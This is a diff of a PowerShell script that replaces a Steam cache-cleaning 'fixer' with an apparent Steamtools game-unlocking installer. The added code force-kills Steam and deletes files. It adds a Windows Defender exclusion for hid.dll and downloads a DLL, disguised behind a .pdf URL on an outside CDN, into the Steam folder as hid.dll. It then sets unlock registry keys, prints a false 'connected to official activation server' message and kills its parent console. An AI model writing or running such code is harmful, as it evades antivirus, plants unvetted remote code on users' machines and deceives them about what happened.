@@ -1,174 +1,126 @@
-#by @piqseu on discord, thank him by spam pinging him. distrubuted via luatools
-#ty @malonin0807 for properly porting it to powershell
-#changes are commented with #+
 
-Write-Host "Starting ST Fixer..." -ForegroundColor Cyan
+$localPath = Join-Path $env:LOCALAPPDATA "steam"
+$steamRegPath = 'HKCU:\Software\Valve\Steam'
+$steamToolsRegPath = 'HKCU:\Software\Valve\Steamtools'
+$steamPath = ""
 
-# Step 1: Find Steam client install location through registry
-Write-Host "`n[Step 1] Finding Steam installation location..." -ForegroundColor Yellow
+function Remove-ItemIfExists($path) {
+    if (Test-Path $path) {
+        Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
+    }
+}
 
-$steamPath = $null
+function ForceStopProcess($processName) {
+    Get-Process $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 2 
+    if (Get-Process $processName -ErrorAction SilentlyContinue) {
+        Start-Process cmd -ArgumentList "/c taskkill /f /im $processName.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
+    }
+}
 
-$registryPaths = @(
-    "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam",
-    "HKLM:\SOFTWARE\Valve\Steam",
-    "HKCU:\SOFTWARE\Valve\Steam",
-    "HKCU:\Software\Classes\steam\shell\open\command"
-)
+function CheckAndPromptProcess($processName, $message) {
+    while (Get-Process $processName -ErrorAction SilentlyContinue) {
+        Write-Host $message -ForegroundColor Red
+        Start-Sleep 1.5
+    }
+}
 
-foreach ($regPath in $registryPaths) {
-    if (-not (Test-Path $regPath)) { continue }
+$filePathToDelete = Join-Path $env:USERPROFILE "get.ps1"
+Remove-ItemIfExists $filePathToDelete
 
+ForceStopProcess "steam"
+if (Get-Process "steam" -ErrorAction SilentlyContinue) {
+    CheckAndPromptProcess "Steam" "[Please exit Steam client first]"
+}
+
+if (Test-Path $steamRegPath) {
+    $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
+    if ($properties -and 'SteamPath' -in $properties.PSObject.Properties.Name) {
+        $steamPath = $properties.SteamPath
+    }
+}
+if ([string]::IsNullOrWhiteSpace($steamPath)) {
+    Write-Host "Official Steam client is not installed on your computer. Please install it and try again." -ForegroundColor Red
+    Start-Sleep 10
+    exit
+}
+
+if (-not (Test-Path $steamPath -PathType Container)) {
+    Write-Host "Official Steam client is not installed on your computer. Please install it and try again." -ForegroundColor Red
+    Start-Sleep 10
+    exit
+}
+
+$steamConfigPath = Join-Path $steamPath "config"
+$hidPath = Join-Path $steamPath "hid.dll"
+Remove-ItemIfExists $hidPath
+
+function PwStart() {
     try {
-        $props = Get-ItemProperty -Path $regPath -ErrorAction Stop
-    } catch {
-        continue
-    }
-
-    # InstallPath
-    if ($props.PSObject.Properties.Name -contains "InstallPath") {
-        if (Test-Path $props.InstallPath) {
-            $steamPath = $props.InstallPath
-            break
+        if (!$steamPath) {
+            return
         }
-    }
-
-    # SteamPath (bazı sistemlerde farklı)
-    if ($props.PSObject.Properties.Name -contains "SteamPath") {
-        if (Test-Path $props.SteamPath) {
-            $steamPath = $props.SteamPath
-            break
+        if (!(Test-Path $localPath)) {
+            New-Item $localPath -ItemType directory -Force -ErrorAction SilentlyContinue       
         }
-    }
 
-    # DefaultValue = steam.exe komut satırı
-    if ($regPath -like "*steam\shell\open\command*") {
-        $cmd = (Get-Item $regPath).GetValue("")  # <-- doğru olan burası
-        if ($cmd) {
-            # "C:\Program Files (x86)\Steam\steam.exe" -applaunch 730
-            $exe = $cmd.Split('"')[1]
-            $steamDir = Split-Path $exe -Parent
+        $steamCfgPath = Join-Path $steamPath "steam.cfg"
+        Remove-ItemIfExists $steamCfgPath
 
-            if (Test-Path $steamDir) {
-                $steamPath = $steamDir
-                break
+        $steamBetaPath = Join-Path $steamPath "package\beta"
+        Remove-ItemIfExists $steamBetaPath
+
+        $catchPath = Join-Path $env:LOCALAPPDATA "Microsoft\Tencent"
+        Remove-ItemIfExists $catchPath
+        try { Add-MpPreference -ExclusionPath $hidPath -ErrorAction SilentlyContinue } catch {}
+
+        $versionDllPath = Join-Path $steamPath "version.dll"
+        Remove-ItemIfExists $versionDllPath
+
+        $downloadHidDll = "https://cdn.wmpvp.com/steamWeb20251106/8552AFBA4FF0405682AC5026477639E8-1762442163370.pdf"
+
+        try {
+            Invoke-RestMethod -Uri $downloadHidDll -OutFile $hidPath -ErrorAction Stop
+        } catch {
+            if (Test-Path $hidPath) {
+                Move-Item -Path $hidPath -Destination "$hidPath.old" -Force -ErrorAction SilentlyContinue
+                Invoke-RestMethod -Uri $downloadHidDll -OutFile $hidPath -ErrorAction SilentlyContinue
             }
         }
-    }
-}
 
-if ($steamPath) {
-    Write-Host "Found Steam installation: $steamPath" -ForegroundColor Green
-} else {
-    Write-Host "Steam installation not found!" -ForegroundColor Red
-    exit 1
-}
+        if (!(Test-Path $steamToolsRegPath)) {
+            New-Item -Path $steamToolsRegPath -Force | Out-Null
+        }
 
-# Step 3: Count .lua files in config/stplug-in
-Write-Host "`n[Step 3] Counting .lua files in config/stplug-in..." -ForegroundColor Yellow
+        Remove-ItemProperty -Path $steamToolsRegPath -Name "ActivateUnlockMode" -ErrorAction SilentlyContinue
+        Remove-ItemProperty -Path $steamToolsRegPath -Name "AlwaysStayUnlocked" -ErrorAction SilentlyContinue
+        Remove-ItemProperty -Path $steamToolsRegPath -Name "notUnlockDepot" -ErrorAction SilentlyContinue
 
-$stplugInPath = Join-Path $steamPath "config\stplug-in"
+        Set-ItemProperty -Path $steamToolsRegPath -Name "iscdkey" -Value "true" -Type String   
 
-if (Test-Path $stplugInPath) {
-    $luaFiles = Get-ChildItem -Path $stplugInPath -Filter "*.lua" -ErrorAction SilentlyContinue
-    $luaCount = $luaFiles.Count
-    
-    if ($luaCount -eq 0) {
-        Write-Host "ERROR: 0 .lua files found in $stplugInPath" -ForegroundColor Red
-    } else {
-        Write-Host "Found $luaCount .lua file(s) in $stplugInPath" -ForegroundColor Green
-    }
-} else {
-    Write-Host "ERROR: Directory not found: $stplugInPath" -ForegroundColor Red
-    Write-Host "ERROR: 0 .lua files found (directory does not exist)" -ForegroundColor Red
-}
+        $steamExePath = Join-Path $steamPath "steam.exe"
+        Start-Process $steamExePath
+        Start-Process "steam://"
+        Write-Host "[Successfully connected to official activation server. Please login to Steam to activate]" -ForegroundColor Green
 
-
-# Step 4: Clear Steam caches while preserving achievements
-Write-Host "`n[Step 4] Clearing Steam caches..." -ForegroundColor Yellow
-
-$backupPath = Join-Path $steamPath "cache-backup"
-# Create backup folder
-Write-Host "Creating backup folder..." -ForegroundColor Gray
-New-Item -ItemType Directory -Path $backupPath -Force | Out-Null
-
-# Kill Steam processes
-Write-Host "Closing Steam processes..." -ForegroundColor Gray
-Get-Process -Name "steam*" -ErrorAction SilentlyContinue | Stop-Process -ErrorAction SilentlyContinue
-Write-Host "Waiting for Steam to close..." -ForegroundColor Gray
-Start-Sleep -Seconds 3
-
-# move main caches to backup folder
-Write-Host "Clearing app and depot caches..." -ForegroundColor Gray
-Start-Sleep -Seconds 1
-
-$appcachePath = Join-Path $steamPath "appcache"
-$appcacheBackupPath = Join-Path $backupPath "appcache"
-if (Test-Path $appcachePath) {
-    New-Item -ItemType Directory -Path $appcacheBackupPath -Force | Out-Null
-    Get-ChildItem -Path $appcachePath -Force -Exclude "stats" | Move-Item -Destination $appcacheBackupPath -Force -ErrorAction SilentlyContinue
-    Copy-Item -Path (Join-Path $appcachePath "stats") -Destination $appcacheBackupPath -Recurse -Force -ErrorAction SilentlyContinue
-}
-
-$depotcachePath = Join-Path $steamPath "depotcache"
-$depotcacheBackupPath = Join-Path $backupPath "depotcache"
-if (Test-Path $depotcachePath) {
-    New-Item -ItemType Directory -Path $depotcacheBackupPath -Force | Out-Null
-    Get-ChildItem -Path $depotcachePath -Force | Move-Item -Destination $depotcacheBackupPath -Force -ErrorAction SilentlyContinue
-    Remove-Item -Path $depotcachePath -Recurse -Force -ErrorAction SilentlyContinue
-}
-
-# Clear user caches
-Write-Host "Clearing user caches..." -ForegroundColor Gray
-$userdataPath = Join-Path $steamPath "userdata"
-$userCount = 0
-if (Test-Path $userdataPath) {
-    $userFolders = Get-ChildItem -Path $userdataPath -Directory -ErrorAction SilentlyContinue
-    foreach ($userFolder in $userFolders) {
-        $userConfigPath = Join-Path $userFolder.FullName "config"
-        if (Test-Path $userConfigPath) {
-            $userCount++
-            $userBackupPath = Join-Path -Path $backupPath -ChildPath (Join-Path "userdata" $userFolder.Name)
-            if (-not (Test-Path $userBackupPath)) {
-                New-Item -ItemType Directory -Path $userBackupPath -Force | Out-Null
-            }
-            $userConfigBackup = Join-Path $userBackupPath "config"
-            Move-Item -Path $userConfigPath -Destination $userConfigBackup -Force -ErrorAction SilentlyContinue
-            #+ restore playtime (stole it from the achievements restore section lmao)
-            Write-Host "Restoring playtime for $($userFolder.Name) ..." -ForegroundColor Gray
+        for ($i = 5; $i -ge 0; $i--) {
+            Write-Host "`r[This window will close in $i seconds...]" -NoNewline
             Start-Sleep -Seconds 1
-            if (Test-Path $userBackupPath) {
-                if (-not (Test-Path (Split-Path $userConfigPath -Parent))) {
-                    New-Item -ItemType Directory -Path (Split-Path $userConfigPath -Parent) -Force | Out-Null
-                }
-                New-Item -ItemType Directory -Path $userConfigPath -Force | Out-Null
-                Copy-Item (Join-Path $userBackupPath "config\localconfig.vdf") -Destination (Join-Path $userConfigPath "localconfig.vdf") -Force -ErrorAction SilentlyContinue
-                Write-Host "Playtime for $($userFolder.Name) restored." -ForegroundColor Green
-                }
         }
-    }
-    if ($userCount -gt 0) {
-        Write-Host "Clearing user cache for $userCount userid(s)..." -ForegroundColor Gray
+
+        $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'"
+        while ($null -ne $instance -and -not($instance.ProcessName -ne "powershell.exe" -and $instance.ProcessName -ne "WindowsTerminal.exe")) {
+            $parentProcessId = $instance.ProcessId
+            $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$($instance.ParentProcessId)'"
+        }
+        if ($null -ne $parentProcessId) {
+            Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue
+        }
+
+        exit
+
+    } catch {
     }
 }
-Write-Host "User cache cleared!" -ForegroundColor Green
 
-
-# Restart Steam with -clearbeta flag
-Write-Host "Starting Steam (beta disabled)..." -ForegroundColor Gray
-$steamExe = Join-Path $steamPath "steam.exe"
-if (Test-Path $steamExe) {
-    Start-Process -FilePath $steamExe -ArgumentList "-clearbeta"
-    Write-Host "Steam started." -ForegroundColor Green
-} else {
-    Write-Host "ERROR: steam.exe not found at $steamExe" -ForegroundColor Red
-}
-
-Write-Host "`n================================================================" -ForegroundColor Cyan
-Write-Host "If you want to revert the cache clearing:" -ForegroundColor Yellow
-Write-Host "Rerun this script and choose 'y' when prompted" -ForegroundColor Yellow
-Write-Host "OR manually move the folders inside $backupPath back to $steamPath" -ForegroundColor Yellow
-Write-Host "================================================================" -ForegroundColor Cyan
-
-Write-Host "Have a nice game"
-Read-Host
+PwStart
